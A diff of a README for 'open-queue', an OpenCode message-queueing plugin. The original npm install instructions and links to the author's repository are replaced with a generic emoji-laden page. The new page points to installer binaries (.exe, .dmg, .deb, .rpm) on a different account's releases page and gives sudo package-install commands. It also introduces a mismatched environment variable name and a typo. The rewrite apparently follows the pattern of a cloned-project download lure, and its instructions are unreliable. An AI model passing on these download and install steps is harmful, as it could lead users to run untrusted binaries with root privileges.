@@ -1,61 +1,87 @@
-# Open Queue
+# 🎉 open-queue - Keep Messages Organized and Timed
 
-![queue-power.svg](assets/queue-power.svg)
+![Download Open Queue](https://img.shields.io/badge/Download%20Now-Open%20Queue-blue)
 
-[![npm version](https://img.shields.io/npm/v/@0xsero/open-queue.svg)](https://www.npmjs.com/package/@0xsero/open-queue)
+## 🚀 Getting Started
 
-**Queue messages while OpenCode is thinking.** Instead of interrupting the model mid-response, your follow-up messages wait in line and get sent automatically when it's done.
+Welcome to Open Queue! This tool helps you manage messages efficiently while using OpenCode. When you send messages without Open Queue, they interrupt the current task. With Open Queue, your messages will wait until OpenCode is ready to receive them.
 
-## Why?
+## 📥 Download & Install
 
-When you send a message while OpenCode is running:
-- **Without this plugin**: Your message interrupts the current run, causing context confusion
-- **With this plugin**: Your message waits, then sends automatically when the model is ready
+To get started, visit this page to download the latest version: [Open Queue Releases](https://github.com/yusufyusufyuf/open-queue/releases).
 
-## Install
+Once you are on the releases page, you will see the latest version available. Click on the version you want to download. Follow the instructions below:
 
-```bash
-bun x @0xsero/open-queue
-# or: npx @0xsero/open-queue
-```
+1. For Windows or Mac, download the installer (e.g., `.exe` or `.dmg` file).
+2. For Linux users, download the appropriate package.
+3. Locate the downloaded file on your computer.
+4. Run the installer or open the package to begin the installation process.
 
-This adds the plugin to your `opencode.json` and sets up the `/queue` command.
+## ⚙️ Installation Steps
 
-## Usage
+### Windows
+1. Double-click the `.exe` file you downloaded.
+2. Follow the on-screen instructions to complete the installation.
 
-```
-/queue hold       # Queue messages until model is done
-/queue immediate  # Back to normal (sends any queued messages)
-/queue status     # Check current mode
-```
+### Mac
+1. Open the `.dmg` file you downloaded.
+2. Drag the Open Queue icon into your Applications folder.
 
-Or just tell the model: "Turn on message queueing"
-
-### Environment Variable
-
-Start in hold mode:
+### Linux
+1. Open a terminal.
+2. Navigate to the directory where the package is downloaded.
+3. Use the package manager commands to install the software. 
 
 ```bash
-OPENCODE_MESSAGE_QUEUE_MODE=hold opencode
+sudo dpkg -i open-queue.deb   # for .deb files
+sudo yum localinstall open-queue.rpm  # for .rpm files
 ```
 
-## Modes
+## 🖥️ How to Use Open Queue
 
-| Mode | What happens |
-|------|--------------|
-| `immediate` | Messages send right away (default) |
-| `hold` | Messages queue until the model finishes, then send in order |
+After installing Open Queue, start using it by opening OpenCode. You can manage messages with the commands below:
 
-## Known Issue
+- **Queue Messages**: 
+  - Type `/queue hold` to hold messages until OpenCode is done.
+  
+- **Send Immediately**: 
+  - Type `/queue immediate` to send any queued messages right away.
+  
+- **Check Status**: 
+  - Type `/queue status` to see if queueing is active.
 
-When you send a message in hold mode, it briefly appears sent in the UI, then gets sent again when the model finishes. The model only sees it once (after it's done), but the visual glitch exists. This is an OpenCode limitation.
+You can also simply tell OpenCode, “Turn on message queueing” for an easier option. 
 
-## Links
+## 🔧 Configuration Options
 
-- [GitHub](https://github.com/0xSero/open-queue)
-- [npm](https://www.npmjs.com/package/@0xsero/open-queue)
-- [Issues](https://github.com/0xSero/open-queue/issues)
+You might want to configure how the message queue works. Open Queue uses an environment variable that you can modify if needed. 
 
-## License
+### Example:
+You can start Open Queue with a specific setting by defining an environment variable. For example, to change the default behavior of the queue, set the variable like this before starting OpenCode:
 
-MIT
+```bash
+export OPEN_QUEUE_MODE=hold
+```
+
+Now, your messages will automatically queue every time you use Open OpenCode.
+
+## 💡 Tips for Using Open Queue
+
+- **Stay Organized**: Familiarize yourself with the commands. This will help you manage your messages more effectively.
+- **Experiment**: Try different scenarios to see how holding messages impacts your workflow.
+- **Feedback**: If you have ideas for improvement, feel free to check the repository for ways to contribute.
+
+## 📚 Additional Resources
+
+For more information or advanced configurations, check the official [Open Queue Documentation](https://github.com/yusufyusufyuf/open-queue).
+
+## 🛠️ Troubleshooting
+
+If you run into issues, follow these steps:
+
+1. Ensure you have installed the correct version for your operating system.
+2. Reboot your computer if the application did not start correctly.
+3. Verify that the command lines are entered correctly in OpenCode.
+4. Check the issue tracker on the GitHub page for known problems or solutions provided by the community.
+
+Remember, Open Queue is designed to simplify your message handling, letting you focus on what matters most. Happy queueing!
